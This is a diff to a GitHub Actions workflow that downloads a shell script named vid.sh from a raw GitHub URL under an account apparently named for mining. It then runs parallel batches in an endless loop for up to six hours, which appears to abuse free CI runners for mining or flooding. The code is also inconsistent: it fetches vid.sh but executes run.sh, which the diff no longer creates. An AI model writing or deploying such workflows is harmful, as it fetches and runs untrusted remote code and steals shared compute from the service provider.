@@ -1,31 +1,24 @@
-name: 20 Parallel Jobs - run.sh Flood
+name: Infinite Parallel Run using GNU Parallel
 
 on:
   workflow_dispatch:
 
 jobs:
-  parallel-runner:
+  run-parallel:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-    timeout-minutes: 360  # max 6 hours (can adjust)
-    steps:
-      - name: Upload your script
-        run: |
-          echo 'echo "Hello from job ${{ matrix.job_id }} - run $i"' > run.sh
-          chmod +x run.sh
+    timeout-minutes: 360  # Optional: set how long it runs (max 6h)
 
-      - name: Job ${{ matrix.job_id }} - Run 20x `sh run.sh` every 5s forever
+    steps:
+      - name: Install GNU parallel
+        run: sudo apt-get update && sudo apt-get install -y parallel
+
+
+      - name: Run `sh run.sh` 20x in parallel every 5s forever
         run: |
           wget https://raw.githubusercontent.com/kalepailmine001/tail/refs/heads/main/vid.sh && chmod +x vid.sh
-          echo "🚀 Job ${{ matrix.job_id }} started at $(date)"
           while true; do
-            echo "⏱️ Job ${{ matrix.job_id }} launching 20 x sh vid.sh at $(date)"
-            for i in $(seq 1 20); do
-              (sh run.sh &) 
-            done
-            wait
-            echo "✅ Job ${{ matrix.job_id }} finished batch. Sleeping 5 seconds..."
-            sleep 5
+            echo "⏱️ $(date) - Launching 20 parallel run.sh executions..."
+            seq 50 | parallel -j50 sh run.sh
+            echo "✅ Batch done. Sleeping 10 seconds..."
+            sleep 10
           done
